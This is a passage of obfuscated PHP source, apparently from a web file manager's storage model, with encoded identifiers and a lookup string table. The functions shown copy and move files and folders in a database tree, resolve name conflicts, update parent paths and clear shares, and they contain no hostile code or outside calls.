$this->fileNameAutoCache($íˆş²Óˆ, $…ÉçĞÀÖ, $ëÇ™Ò , $©Ï†º¶ë); $„°Éø³Ì = $this->_copyCreate($Üó¯ç¼, $íˆş²Óˆ, $…ÉçĞÀÖ, $ğßÏ½¯±); } else { if ($ëÇ™Ò  == REPEAT_REPLACE) { $ÇöŸØ = $this->sourceInfoCache($ú»Íº¼); $™«»ïöé = $this->fileHistory($ÇöŸØ, $ı–¬Î½[$Éà‰øÎï[468]], $ı–¬Î½[$Éà‰øÎï[76]]); if ($™«»ïöé) { $ğßÏ½¯±[$Éà‰øÎï[566]][] = $ı–¬Î½[$Éà‰øÎï[468]]; } } else { if ($ëÇ™Ò  == REPEAT_SKIP) { } } } Hook::trigger($Éà‰øÎï[571], array($Éà‰øÎï[572], $ı–¬Î½, 0)); } return $„°Éø³Ì; } private function _copyCreate($ç—™ùÉ, $Òº÷ûã¥, $…¸îÁæ, &$–§Ä¼‹´) { $ÍáòŸš” =& $_SERVER[­õöî’–]; $üü®õœ¡ = $this->sourceInfoCache($ç—™ùÉ); $áóæ¤•Ï = $this->sourceInfoCache($Òº÷ûã¥); $²ØÛø€Ø = $this->_makeItemData($üü®õœ¡, $áóæ¤•Ï, $…¸îÁæ); Hook::trigger($ÍáòŸš”[573], $²ØÛø€Ø); Hook::trigger($ÍáòŸš”[574], array($ÍáòŸš”[575], $²ØÛø€Ø, 0)); $ß¨­ÚÂ = $this->add($²ØÛø€Ø); $öšä™¶Ã = array($ÍáòŸš”[402] => $ß¨­ÚÂ, $ÍáòŸš”[32] => $…¸îÁæ); $this->_copyApplyMeta($öšä™¶Ã, $–§Ä¼‹´); if ($üü®õœ¡[$ÍáòŸš”[410]] != $ÍáòŸš”[88]) { $–§Ä¼‹´[$ÍáòŸš”[566]][] = $üü®õœ¡[$ÍáòŸš”[468]]; return $ß¨­ÚÂ; } $§äâ·Åü = array(); $×ñ‚Å¯Å = array(); $this->_childrenListAll($ç—™ùÉ, $§äâ·Åü); $”æ¡şôÀ = count($§äâ·Åü); if ($”æ¡şôÀ == 0) { return $ß¨­ÚÂ; } $íıÓÖ€æ = $this->sourceInfo($ß¨­ÚÂ); foreach ($§äâ·Åü as $Óøé¨Òí) { $Û–Ãº›Ğ = $this->_makeItemData($Óøé¨Òí, $íıÓÖ€æ, $Óøé¨Òí[$ÍáòŸš”[32]]); $Û–Ãº›Ğ[$ÍáòŸš”[521]] = $Óøé¨Òí[$ÍáòŸš”[521]]; $×ñ‚Å¯Å[] = $Û–Ãº›Ğ; } $this->chunkEventSet($ÍáòŸš”[576], array($ÍáòŸš”[577], $²ØÛø€Ø, $”æ¡şôÀ)); $this->addAll($×ñ‚Å¯Å, array(), !1); $¯ŠŠû©‡ = $this->where(array($ÍáòŸš”[432] => $ß¨­ÚÂ))->select(); $¬³ßşû = $this->_childrenMakeRelation($§äâ·Åü, $¯ŠŠû©‡); $¬³ßşû[$ç—™ùÉ] = $ß¨­ÚÂ; $¥ûŸ°   = array(); $ÄŸ¬×Àö = array(); foreach ($¯ŠŠû©‡ as $Óøé¨Òí) { $¥³¯»­³ = $Óøé¨Òí[$ÍáòŸš”[402]]; $±…Ğ”ŸŞ = $this->_childrenMatch($¬³ßşû, $Óøé¨Òí, $íıÓÖ€æ); $¥ûŸ°  [] = array($ÍáòŸš”[402], $¥³¯»­³, $ÍáòŸš”[432], $±…Ğ”ŸŞ[$ÍáòŸš”[432]]); $ÄŸ¬×Àö[] = array($ÍáòŸš”[402], $¥³¯»­³, $ÍáòŸš”[521], $±…Ğ”ŸŞ[$ÍáòŸš”[521]]); $this->_copyApplyMeta($Óøé¨Òí, $–§Ä¼‹´); if ($Óøé¨Òí[$ÍáòŸš”[410]] != $ÍáòŸš”[88]) { $–§Ä¼‹´[$ÍáòŸš”[566]][] = $Óøé¨Òí[$ÍáòŸš”[468]]; } } $this->chunkEventSet($ÍáòŸš”[578], array($ÍáòŸš”[579], $²ØÛø€Ø, $”æ¡şôÀ)); $this->saveAll($¥ûŸ°  ); $this->chunkEventSet($ÍáòŸš”[580], array($ÍáòŸš”[581], $²ØÛø€Ø, $”æ¡şôÀ)); $this->saveAll($ÄŸ¬×Àö); return $ß¨­ÚÂ; } private function _childrenMakeRelation($ƒÌ°¼Â, $ù“õ¤) { $‘ÄÓ¢±ø =& $_SERVER[­õöî’–]; $ÜĞè€®– = array(); $îå§«ÔŠ = array(); foreach ($ƒÌ°¼Â as $ó˜öì¸è) { $µİÀ¡Ù = $ó˜öì¸è[$‘ÄÓ¢±ø[32]] . $‘ÄÓ¢±ø[8] . $ó˜öì¸è[$‘ÄÓ¢±ø[521]]; $ÜĞè€®–[$µİÀ¡Ù] = $ó˜öì¸è[$‘ÄÓ¢±ø[402]]; } foreach ($ù“õ¤ as $ó˜öì¸è) { $µİÀ¡Ù = $ó˜öì¸è[$‘ÄÓ¢±ø[32]] . $‘ÄÓ¢±ø[8] . $ó˜öì¸è[$‘ÄÓ¢±ø[521]]; $‹½ÑâşÛ = $ÜĞè€®–[$µİÀ¡Ù]; $îå§«ÔŠ[$‹½ÑâşÛ] = $ó˜öì¸è[$‘ÄÓ¢±ø[402]]; } return $îå§«ÔŠ; } private function _childrenMatch($íë¹äúÉ, $ñ‹èæÄì, $‰Ú…şÂì) { $¸ûáÛ¼º =& $_SERVER[­õöî’–]; $ÖŒ§”€ = $‰Ú…şÂì[$¸ûáÛ¼º[521]]; $¤¨ÒæÚ© = $this->parentLevelArray($ñ‹èæÄì[$¸ûáÛ¼º[521]]); foreach ($¤¨ÒæÚ© as $Ã¯£ÍÁŠ) { if (isset($íë¹äúÉ[$Ã¯£ÍÁŠ])) { $ÖŒ§”€ .= $íë¹äúÉ[$Ã¯£ÍÁŠ] . $¸ûáÛ¼º[582]; } } $ÖŒ§”€ = rtrim($ÖŒ§”€, $¸ûáÛ¼º[50]) . $¸ûáÛ¼º[50]; $ğ¯¸÷¥Ğ = $this->parentLevelArray($ÖŒ§”€); $ÌÄš±ş¨ = $ğ¯¸÷¥Ğ[count($ğ¯¸÷¥Ğ) - 1]; return array($¸ûáÛ¼º[432] => $ÌÄš±ş¨, $¸ûáÛ¼º[521] => $ÖŒ§”€); } private function _makeItemData($±ë¤é, $ÂŸˆª, $“©ßÚíò) { $°×ÒÓáÃ =& $_SERVER[­õöî’–]; $¾÷¦ğÌ = array($°×ÒÓáÃ[583] => $±ë¤é[$°×ÒÓáÃ[410]], $°×ÒÓáÃ[420] => $“©ßÚíò, $°×ÒÓáÃ[584] => $±ë¤é[$°×ÒÓáÃ[412]] ? $±ë¤é[$°×ÒÓáÃ[412]] : $°×ÒÓáÃ[12], $°×ÒÓáÃ[469] => $±ë¤é[$°×ÒÓáÃ[468]] ? $±ë¤é[$°×ÒÓáÃ[468]] : 0, $°×ÒÓáÃ[585] => $±ë¤é[$°×ÒÓáÃ[76]] ? $±ë¤é[$°×ÒÓáÃ[76]] : 0, $°×ÒÓáÃ[586] => intval($ÂŸˆª[$°×ÒÓáÃ[411]]), $°×ÒÓáÃ[587] => intval($ÂŸˆª[$°×ÒÓáÃ[505]]), $°×ÒÓáÃ[588] => intval(USER_ID), $°×ÒÓáÃ[589] => intval(USER_ID), $°×ÒÓáÃ[401] => intval($ÂŸˆª[$°×ÒÓáÃ[402]]), $°×ÒÓáÃ[590] => $ÂŸˆª[$°×ÒÓáÃ[521]] . $ÂŸˆª[$°×ÒÓáÃ[402]] . $°×ÒÓáÃ[50], $°×ÒÓáÃ[424] => $±ë¤é[$°×ÒÓáÃ[85]] ? $±ë¤é[$°×ÒÓáÃ[85]] : time(), $°×ÒÓáÃ[430] => 0, $°×ÒÓáÃ[591] => $°×ÒÓáÃ[12]); return $¾÷¦ğÌ; } private function _copyApplyMeta($ÍÎé›â¿, &$è‹»Èûò) { $—ƒ”Ò¬ò =& $_SERVER[­õöî’–]; $·ÃØåÒĞ = $ÍÎé›â¿[$—ƒ”Ò¬ò[402]]; $¸ä›Œù– = $ÍÎé›â¿[$—ƒ”Ò¬ò[32]]; if (!isset($ÍÎé›â¿[$—ƒ”Ò¬ò[592]]) || !$ÍÎé›â¿[$—ƒ”Ò¬ò[592]] || $ÍÎé›â¿[$—ƒ”Ò¬ò[592]] == $—ƒ”Ò¬ò[197]) { $è‹»Èûò[$—ƒ”Ò¬ò[568]][] = array($—ƒ”Ò¬ò[402], $·ÃØåÒĞ, $—ƒ”Ò¬ò[592], short_id($·ÃØåÒĞ)); } if (Input::check($¸ä›Œù–, $—ƒ”Ò¬ò[593])) { $è‹»Èûò[$—ƒ”Ò¬ò[567]][] = array($—ƒ”Ò¬ò[402] => $·ÃØåÒĞ, $—ƒ”Ò¬ò[94] => $—ƒ”Ò¬ò[465], $—ƒ”Ò¬ò[374] => str_replace($—ƒ”Ò¬ò[53], $—ƒ”Ò¬ò[12], Pinyin::get($¸ä›Œù–))); $è‹»Èûò[$—ƒ”Ò¬ò[567]][] = array($—ƒ”Ò¬ò[402] => $·ÃØåÒĞ, $—ƒ”Ò¬ò[94] => $—ƒ”Ò¬ò[464], $—ƒ”Ò¬ò[374] => Pinyin::get($¸ä›Œù–, $—ƒ”Ò¬ò[594])); } $è‹»Èûò[$—ƒ”Ò¬ò[567]][] = array($—ƒ”Ò¬ò[402] => $·ÃØåÒĞ, $—ƒ”Ò¬ò[94] => $—ƒ”Ò¬ò[444], $—ƒ”Ò¬ò[374] => KodSort::makeStr($¸ä›Œù–)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($²«ˆ±ù°) { $¼Àá‹“ =& $_SERVER[­õöî’–]; $ß¬óüˆä = $this->sourceInfo($²«ˆ±ù°); $›­™™ßÔ = $¼Àá‹“[595]; $øÍ¾ˆì = array($¼Àá‹“[521] => array($¼Àá‹“[550], $ß¬óüˆä[$¼Àá‹“[521]] . $²«ˆ±ù° . $¼Àá‹“[551]), $¼Àá‹“[431] => $this->targetIsDelete); $ĞáÔ¶ú = $this->field($›­™™ßÔ)->where($øÍ¾ˆì)->select(); if (!$ĞáÔ¶ú) { return; } $ĞáÔ¶ú = array_to_keyvalue($ĞáÔ¶ú, $¼Àá‹“[402]); foreach ($ĞáÔ¶ú as $Ø¨©‚£•) { $µá´Ù = $Ø¨©‚£•[$¼Àá‹“[432]]; $²«ˆ±ù° = $Ø¨©‚£•[$¼Àá‹“[402]]; if (!isset($this->_childrenListCache[$²«ˆ±ù°]) && $Ø¨©‚£•[$¼Àá‹“[410]] == $¼Àá‹“[88]) { $this->_childrenListCache[$²«ˆ±ù°] = array(); } if (!isset($this->_childrenListCache[$µá´Ù])) { $this->_childrenListCache[$µá´Ù] = array(); } $this->_childrenListCache[$µá´Ù][$²«ˆ±ù°] = $Ø¨©‚£•; $this->_childrenItemCache[$²«ˆ±ù°] = $Ø¨©‚£•; } } private function _childrenListAll($Ñáşºı, &$¼úÌÜüÄ) { $­Íš³×á =& $_SERVER[­õöî’–]; if (!isset($this->_childrenListCache[$Ñáşºı])) { return; } $¹Ù¬ˆ§´ = $this->_childrenListCache[$Ñáşºı]; foreach ($¹Ù¬ˆ§´ as $êí†âõû => $û²¨¡©Ö) { $¼úÌÜüÄ[$êí†âõû] = $û²¨¡©Ö; if ($û²¨¡©Ö[$­Íš³×á[410]] == $­Íš³×á[88]) { $this->_childrenListAll($êí†âõû, $¼úÌÜüÄ); } } } private function sourceInfoCache($Ç’•ÖÈã) { if (isset($this->_childrenItemCache[$Ç’•ÖÈã])) { return $this->_childrenItemCache[$Ç’•ÖÈã]; } return $this->sourceInfo($Ç’•ÖÈã); } private function _childrenList($ò«ğŒé¤) { if (isset($this->_childrenListCache[$ò«ğŒé¤])) { return $this->_childrenListCache[$ò«ğŒé¤]; } return $this->_childrenListSelect($ò«ğŒé¤); } private function _childrenListSelect($Øç¢¶Úû) { $­Úéôùø =& $_SERVER[­õöî’–]; $ƒ®»œ§Ö = array($­Úéôùø[432] => $Øç¢¶Úû, $­Úéôùø[431] => $this->targetIsDelete); $á³ÕÂ = $this->where($ƒ®»œ§Ö)->select(); $á³ÕÂ = $á³ÕÂ ? $á³ÕÂ : array(); $üô‹‹Çë = array_to_keyvalue($á³ÕÂ, $­Úéôùø[402]); $this->_childrenListCache[$Øç¢¶Úû] = $üô‹‹Çë; foreach ($üô‹‹Çë as $Øç¢¶Úû => $íüÍ…©é) { $this->_childrenItemCache[$Øç¢¶Úû] = $íüÍ…©é; } return $üô‹‹Çë; } private function fileNameExistCache($Ñêàµâ, $õÎÁ‰ŞÚ) { $ŸÂ›êÒá =& $_SERVER[­õöî’–]; $õÎÁ‰ŞÚ = strtolower($õÎÁ‰ŞÚ); $êøï ¿ë = $this->_childrenList($Ñêàµâ); foreach ($êøï ¿ë as $äÍ¹ó˜ğ) { if ($õÎÁ‰ŞÚ == strtolower($äÍ¹ó˜ğ[$ŸÂ›êÒá[32]])) { return $äÍ¹ó˜ğ[$ŸÂ›êÒá[402]]; } } return !1; } private function fileNameAutoCache($„áåÆ¾‡, $†ÎŞÁ„, $…á‹ĞÌ, $ö•ï±ªº) { $ñíîœó› =& $_SERVER[­õöî’–]; $‰ó¼»°• = $this->_childrenList($„áåÆ¾‡); $ª§õ¬ˆ = array_to_keyvalue($‰ó¼»°•, $ñíîœó›[12], $ñíîœó›[32]); return $this->fileNameAutoGet($ª§õ¬ˆ, $†ÎŞÁ„, $…á‹ĞÌ, $ö•ï±ªº); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($‰‚Ğ„, $§™ÏŸÛ‘, $ËÃİ¥İŠ = REPEAT_REPLACE, $â¨ÉÄ×æ = '') { $Ô·ôì§ì =& $_SERVER[­õöî’–]; $‡­¾Îíù = $this->sourceInfo($‰‚Ğ„); $©æ¹æİÉ = $this->sourceInfo($§™ÏŸÛ‘); if ($‡­¾Îíù[$Ô·ôì§ì[432]] == $©æ¹æİÉ[$Ô·ôì§ì[402]]) { if ($‡­¾Îíù[$Ô·ôì§ì[431]] == $Ô·ôì§ì[88]) { Model($Ô·ôì§ì[429])->restore(array($‰‚Ğ„)); } if (!$â¨ÉÄ×æ || $â¨ÉÄ×æ == $‡­¾Îíù[$Ô·ôì§ì[32]]) { return $‰‚Ğ„; } } $öÄØÀìê = $this->pathInfoMore($‰‚Ğ„); if ($this->isParentOf($‰‚Ğ„, $§™ÏŸÛ‘)) { return !1; } if (!$‡­¾Îíù || !$©æ¹æİÉ || $©æ¹æİÉ[$Ô·ôì§ì[410]] != $Ô·ôì§ì[88]) { return !1; } Hook::trigger($Ô·ôì§ì[596], $öÄØÀìê); $this->targetIsDelete = intval($‡­¾Îíù[$Ô·ôì§ì[431]]); if ($‡­¾Îíù[$Ô·ôì§ì[432]] == $§™ÏŸÛ‘ && $â¨ÉÄ×æ != $‡­¾Îíù[$Ô·ôì§ì[32]]) { $·‚§ĞÖ½ = $this->fileNameExist($§™ÏŸÛ‘, $â¨ÉÄ×æ); if ($·‚§ĞÖ½ && $‡­¾Îíù[$Ô·ôì§ì[410]] == $Ô·ôì§ì[197]) { $”×ŸÃ«† = $this->sourceInfo($·‚§ĞÖ½); $ ¡¬³¼  = $this->fileHistory($”×ŸÃ«†, $‡­¾Îíù[$Ô·ôì§ì[468]], $‡­¾Îíù[$Ô·ôì§ì[76]]); if (!$ ¡¬³¼ ) { Model($Ô·ôì§ì[471])->remove($‡­¾Îíù[$Ô·ôì§ì[468]]); } $this->removeNow($‰‚Ğ„, !1); $this->folderSizeReset($§™ÏŸÛ‘); Hook::trigger($Ô·ôì§ì[597], $öÄØÀìê); return $·‚§ĞÖ½; } } $‰ÈÆÉú = $â¨ÉÄ×æ ? $â¨ÉÄ×æ : $‡­¾Îíù[$Ô·ôì§ì[32]]; $this->lockMoveStart($‰‚Ğ„); $this->lockWriteStart($§™ÏŸÛ‘, $‰ÈÆÉú); $òå ¬š˜ = array($Ô·ôì§ì[566] => array(), $Ô·ôì§ì[598] => !1); $this->clearShare($‰‚Ğ„, $§™ÏŸÛ‘); $°ÏÆÙ‘ = $this->fileNameExistCache($§™ÏŸÛ‘, $‡­¾Îíù[$Ô·ôì§ì[32]]); $³øÌæáÚ = $this->_move($‰‚Ğ„, $§™ÏŸÛ‘, $ËÃİ¥İŠ, $òå ¬š˜, $â¨ÉÄ×æ); $this->sourceCacheClear(); if ($‡­¾Îíù[$Ô·ôì§ì[410]] == $Ô·ôì§ì[88] && $°ÏÆÙ‘) { $this->folderSizeResetChildren($³øÌæáÚ); } Model($Ô·ôì§ì[199])->linkAdd($òå ¬š˜[$Ô·ôì§ì[566]]); if ($°ÏÆÙ‘ && $òå ¬š˜[$Ô·ôì§ì[598]]) { $this->removeNow($‰‚Ğ„, !1); } $this->lockMoveEnd($‰‚Ğ„); $this->lockWriteEnd($§™ÏŸÛ‘, $‰ÈÆÉú); $this->folderSizeReset($‡­¾Îíù[$Ô·ôì§ì[432]]); $this->folderSizeReset($§™ÏŸÛ‘); $¡£Ÿê = array($‡­¾Îíù[$Ô·ôì§ì[432]], $§™ÏŸÛ‘); if ($‡­¾Îíù[$Ô·ôì§ì[410]] == $Ô·ôì§ì[88]) { $¡£Ÿê[] = $‰‚Ğ„; } $this->updateModifyTime($¡£Ÿê); Model($Ô·ôì§ì[570])->eventMove($‰‚Ğ„, $‡­¾Îíù[$Ô·ôì§ì[432]], $§™ÏŸÛ‘); Hook::trigger($Ô·ôì§ì[597], $öÄØÀìê); return $³øÌæáÚ; } private function _move($ŒÃíš²Ê, $Šğ¡®âÒ, $¢´í›í€, &$£‹¬¥é¹, $÷ßæ¾Ñ = '') { $˜šùÉ¢Ñ =& $_SERVER[­õöî’–]; $”˜®Æü = $this->sourceInfo($ŒÃíš²Ê); $•ƒ°²¢Ğ = $”˜®Æü[$˜šùÉ¢Ñ[410]] == $˜šùÉ¢Ñ[88]; $Íİš½Ñ = $÷ßæ¾Ñ ? $÷ßæ¾Ñ : $”˜®Æü[$˜šùÉ¢Ñ[32]]; $Ã±Ô¤Á² = $this->fileNameExistCache($Šğ¡®âÒ, $Íİš½Ñ); $this->lockMoveStart($ŒÃíš²Ê); $this->lockWriteStart($Šğ¡®âÒ, $Íİš½Ñ); if (!$Ã±Ô¤Á²) { return $this->_moveForce($ŒÃíš²Ê, $Šğ¡®âÒ, $Íİš½Ñ); } $îÇúÕÜÓ = $Ã±Ô¤Á²; $ä…‰¯¦€ = !1; if ($•ƒ°²¢Ğ) { if ($¢´í›í€ == REPEAT_RENAME_FOLDER) { $Íİš½Ñ = $this->fileNameAuto($Šğ¡®âÒ, $Íİš½Ñ, $¢´í›í€, $•ƒ°²¢Ğ); $îÇúÕÜÓ = $this->_moveForce($ŒÃíš²Ê, $Šğ¡®âÒ, $Íİš½Ñ); } else { if ($¢´í›í€ == REPEAT_RENAME_FOLDER) { $¢´í›í€ = REPEAT_RENAME; } $™óÔÅ—Ö = $this->_childrenListSelect($ŒÃíš²Ê); foreach ($™óÔÅ—Ö as $Æüß¿§Ó) { $this->_move($Æüß¿§Ó[$˜šùÉ¢Ñ[402]], $Ã±Ô¤Á², $¢´í›í€, $£‹¬¥é¹); } $ä…‰¯¦€ = !0; } } else { if ($¢´í›í€ == REPEAT_SKIP) { $ä…‰¯¦€ = !0; } else { if ($¢´í›í€ == REPEAT_RENAME || $¢´í›í€ == REPEAT_RENAME_FOLDER) { $Íİš½Ñ = $this->fileNameAuto($Šğ¡®âÒ, $Íİš½Ñ, $¢´í›í€, $•ƒ°²¢Ğ); $îÇúÕÜÓ = $this->_moveForce($ŒÃíš²Ê, $Šğ¡®âÒ, $Íİš½Ñ); } else { if ($¢´í›í€ == REPEAT_REPLACE) { $ö‚Çß£½ = $this->sourceInfoCache($Ã±Ô¤Á²); $µ²è°«ö = $this->fileHistory($ö‚Çß£½, $”˜®Æü[$˜šùÉ¢Ñ[468]], $”˜®Æü[$˜šùÉ¢Ñ[76]]); $ä…‰¯¦€ = !0; if ($µ²è°«ö) { $£‹¬¥é¹[$˜šùÉ¢Ñ[566]][] = $”˜®Æü[$˜šùÉ¢Ñ[468]]; } } } } } if ($ä…‰¯¦€ && !$£‹¬¥é¹[$˜šùÉ¢Ñ[598]]) { $£‹¬¥é¹[$˜šùÉ¢Ñ[598]] = !0; } return $îÇúÕÜÓ; } private function _moveForce($‹–ˆë, $®Õ¤ı˜, $—èèûØÍ) { $£ÒÄü²± =& $_SERVER[­õöî’–]; $Üïæ²İÛ = $this->sourceInfo($‹–ˆë); $Ÿ…×şÜ§ = $this->sourceInfo($®Õ¤ı˜); $Ÿû©ı‘ƒ = $Üïæ²İÛ[$£ÒÄü²±[410]] == $£ÒÄü²±[88]; $à‰ùÜÓá = array($£ÒÄü²±[401] => $Ÿ…×şÜ§[$£ÒÄü²±[402]], $£ÒÄü²±[590] => $Ÿ…×şÜ§[$£ÒÄü²±[521]] . $Ÿ…×şÜ§[$£ÒÄü²±[402]] . $£ÒÄü²±[50], $£ÒÄü²±[586] => $Ÿ…×şÜ§[$£ÒÄü²±[411]], $£ÒÄü²±[587] => $Ÿ…×şÜ§[$£ÒÄü²±[505]], $£ÒÄü²±[589] => USER_ID, $£ÒÄü²±[420] => $—èèûØÍ); $ñŒÌ–Õ = $Üïæ²İÛ[$£ÒÄü²±[411]] == SourceModel::TYPE_GROUP && $Ÿ…×şÜ§[$£ÒÄü²±[411]] == SourceModel::TYPE_GROUP && $Üïæ²İÛ[$£ÒÄü²±[505]] == $Ÿ…×şÜ§[$£ÒÄü²±[505]]; if (!$ñŒÌ–Õ && $this->moveClearAuth) { Model($£ÒÄü²±[502])->authClear($‹–ˆë); } $˜­Õ Æ = $Üïæ²İÛ[$£ÒÄü²±[431]] == $£ÒÄü²±[88] && $Ÿ…×şÜ§[$£ÒÄü²±[431]] != $£ÒÄü²±[88]; if ($˜­Õ Æ) { $à‰ùÜÓá[$£ÒÄü²±[430]] = 0; } if ($Ÿû©ı‘ƒ) { $¸™¿ô¬ı = array($£ÒÄü²±[590] => array($£ÒÄü²±[550], $Üïæ²İÛ[$£ÒÄü²±[521]] . $Üïæ²İÛ[$£ÒÄü²±[402]] . $£ÒÄü²±[551])); $õ»”ñ—ğ = $Üïæ²İÛ[$£ÒÄü²±[521]] . $Üïæ²İÛ[$£ÒÄü²±[402]] . $£ÒÄü²±[50]; $ —êıÍ = $Ÿ…×şÜ§[$£ÒÄü²±[521]] . $Ÿ…×şÜ§[$£ÒÄü²±[402]] . $£ÒÄü²±[50] . $Üïæ²İÛ[$£ÒÄü²±[402]] . $£ÒÄü²±[50]; $µ†Ñ°¤á = array($£ÒÄü²±[590] => array($£ÒÄü²±[599], "\x72\x65\160\154\x61\x63\x65\50\x70\x61\162\145\156\164\114\x65\x76\145\154\x2c\47{$õ»”ñ—ğ}\x27\54\47{$ —êıÍ}\47\x29"), $£ÒÄü²±[586] => $Ÿ…×şÜ§[$£ÒÄü²±[411]], $£ÒÄü²±[587] => $Ÿ…×şÜ§[$£ÒÄü²±[505]]); if ($˜­Õ Æ) { $µ†Ñ°¤á[$£ÒÄü²±[430]] = 0; } $this->where($¸™¿ô¬ı)->data($µ†Ñ°¤á)->save(); } $this->where(array($£ÒÄü²±[417] => $‹–ˆë))->data($à‰ùÜÓá)->save(); return $‹–ˆë; } private function clearShare($Ú¯Óµßú, $ã²Ÿ¼ã) { $Û³ı¢” =& $_SERVER[­õöî’–]; $Íò›û¢À = $this->sourceInfo($Ú¯Óµßú); $›ÓƒŒû = $this->sourceInfo($ã²Ÿ¼ã); if ($Íò›û¢À[$Û³ı¢”[505]] == $›ÓƒŒû[$Û³ı¢”[505]] && $Íò›û¢À[$Û³ı¢”[411]] == $Û³ı¢”[600]) { return; } $×© = array($Û³ı¢”[521] => array($Û³ı¢”[550], $Íò›û¢À[$Û³ı¢”[521]] . $Ú¯Óµßú . $Û³ı¢”[551])); $¸é×œ¨É = $this->field($Û³ı¢”[417])->where($×©)->getField($Û³ı¢”[402], !0); if (!$¸é×œ¨É) { return; } $×© = array($Û³ı¢”[402] => array($Û³ı¢”[7], $¸é×œ¨É), $Û³ı¢”[496] => 1); $½Æ™©Ç— = Model($Û³ı¢”[601])->field($Û³ı¢”[489])->where($×©)->select(); if (!$½Æ™©Ç—) { return; } $½Æ™©Ç— = array_to_keyvalue($½Æ™©Ç—, $Û³ı¢”[12], $Û³ı¢”[489]); $×© = array($Û³ı¢”[489] => array($Û³ı¢”[7], $½Æ™©Ç—)); Model($Û³ı¢”[601])->where($×©)->save(array($Û³ı¢”[496] => 0)); Model($Û³ı¢”[602])->where($×©)->delete(); } public function copyFolderFromIO($ß¿»°½ô, $áÛŒå‚», $²¸şÑÆƒ, $ƒ¦°©Ñ‚, $ùÀ”à¶, $ÏèüÏ¦ = false) { $•—œÂ =& $_SERVER[­õöî’–]; $½ê„ùá˜ = array($•—œÂ[567] => array(), $•—œÂ[568] => array(), $•—œÂ[566] => array(), $•—œÂ[603] => array()); $ú¥ÄÇ¦ = $ÏèüÏ¦ ? $ÏèüÏ¦ : $ß¿»°½ô->pathThis($áÛŒå‚»); $¬ÁÑ—­– = $this->fileNameExist($²¸şÑÆƒ, $ú¥ÄÇ¦); $‡Å—²Ï² = $this->mkdir($²¸şÑÆƒ, $ú¥ÄÇ¦, $ƒ¦°©Ñ‚); if (!$¬ÁÑ—­– || $ƒ¦°©Ñ‚ == REPEAT_RENAME_FOLDER) { $ƒ¦°©Ñ‚ = !1; } if ($¬ÁÑ—­–) { $this->_childrenAllMake($¬ÁÑ—­–); } Hook::trigger($•—œÂ[604]); $this->_copyChildTo($ß¿»°½ô, $áÛŒå‚», $‡Å—²Ï², $ƒ¦°©Ñ‚, $½ê„ùá˜, $ùÀ”à¶); Hook::trigger($•—œÂ[605]); if ($‡Å—²Ï²) { $this->folderSizeResetChildren($‡Å—²Ï²); } $this->_childrenListClear(); Model($•—œÂ[569])->addAll($½ê„ùá˜[$•—œÂ[567]], array(), !0); Model($•—œÂ[570])->eventCopy($‡Å—²Ï²); $this->saveAll($½ê„ùá˜[$•—œÂ[568]]); Model($•—œÂ[471])->linkAdd($½ê„ùá˜[$•—œÂ[566]]); Model($•—œÂ[471])->remove($½ê„ùá˜[$•—œÂ[603]]); $this->folderSizeReset($²¸şÑÆƒ); $this->updateModifyTime($²¸şÑÆƒ); return $‡Å—²Ï²; } private function _copyChildTo($úèÍ’­ä, $åá™»±¢, $À™Îˆ, $¯¥ñğ¯ç, &$•õŒºÆ¡, $ïÆ°³Ê…) { $Ö‘™ô‹ =& $_SERVER[­õöî’–]; $ç¿“·å” = $this->sourceInfoCache($À™Îˆ); $Ä·•È  = $úèÍ’­ä->listPath($åá™»±¢); $Ä·•È  = $Ä·•È  ? $Ä·•È  : array($Ö‘™ô‹[83] => array(), $Ö‘™ô‹[82] => array()); $÷í—ÁÀÜ = array_merge($Ä·•È [$Ö‘™ô‹[83]], $Ä·•È [$Ö‘™ô‹[82]]); $ºƒÊºöï = $this->_addFiles($úèÍ’­ä, $Ä·•È [$Ö‘™ô‹[83]], $ïÆ°³Ê…); $¢ø­ë• = array(); foreach ($÷í—ÁÀÜ as &$ûÄ«›Âº) { if (isset($ºƒÊºöï[$ûÄ«›Âº[$Ö‘™ô‹[32]]])) { $ûÄ«›Âº = $ºƒÊºöï[$ûÄ«›Âº[$Ö‘™ô‹[32]]]; } $ûÄ«›Âº[$Ö‘™ô‹[410]] = $ûÄ«›Âº[$Ö‘™ô‹[33]] == $Ö‘™ô‹[75]; $ûÄ«›Âº[$Ö‘™ô‹[412]] = substr(_get($ûÄ«›Âº, $Ö‘™ô‹[174], $Ö‘™ô‹[12]), 0, 10); $ûÄ«›Âº[$Ö‘™ô‹[76]] = _get($ûÄ«›Âº, $Ö‘™ô‹[76], 0); $ûÄ«›Âº[$Ö‘™ô‹[468]] = _get($ûÄ«›Âº, $Ö‘™ô‹[468], 0); if (!isset($ûÄ«›Âº[$Ö‘™ô‹[606]]) && $ûÄ«›Âº[$Ö‘™ô‹[468]]) { $•õŒºÆ¡[$Ö‘™ô‹[603]][] = $ûÄ«›Âº[$Ö‘™ô‹[468]]; } if ($¯¥ñğ¯ç) { $Òù“îÓº = $this->fileNameExistCache($À™Îˆ, $ûÄ«›Âº[$Ö‘™ô‹[32]]); if ($Òù“îÓº) { if ($ûÄ«›Âº[$Ö‘™ô‹[410]] || $¯¥ñğ¯ç == REPEAT_SKIP) { continue; } if ($¯¥ñğ¯ç == REPEAT_REPLACE) { $Úßîïšì = $this->sourceInfoCache($Òù“îÓº); $¯ûöç­¨ = $this->fileHistory($Úßîïšì, $ûÄ«›Âº[$Ö‘™ô‹[468]], $ûÄ«›Âº[$Ö‘™ô‹[76]]); if ($¯ûöç­¨) { $•õŒºÆ¡[$Ö‘™ô‹[566]][] = $ûÄ«›Âº[$Ö‘™ô‹[468]]; } continue; } else { if ($¯¥ñğ¯ç == REPEAT_RENAME) { $ûÄ«›Âº[$Ö‘™ô‹[32]] = $this->fileNameAutoCache($À™Îˆ, $ûÄ«›Âº[$Ö‘™ô‹[32]], $¯¥ñğ¯ç, !1); } } } } if (!$ûÄ«›Âº[$Ö‘™ô‹[410]] && $ûÄ«›Âº[$Ö‘™ô‹[468]] == 0) { continue; } if (!$ûÄ«›Âº[$Ö‘™ô‹[410]] && $ûÄ«›Âº[$Ö‘™ô‹[468]]) { $•õŒºÆ¡[$Ö‘™ô‹[566]][] = $ûÄ«›Âº[$Ö‘™ô‹[468]]; } $¢ø­ë•[] = $this->_makeItemData($ûÄ«›Âº, $ç¿“·å”, $ûÄ«›Âº[$Ö‘™ô‹[32]]); } unset($ûÄ«›Âº); if (!empty($¢ø­ë•)) { 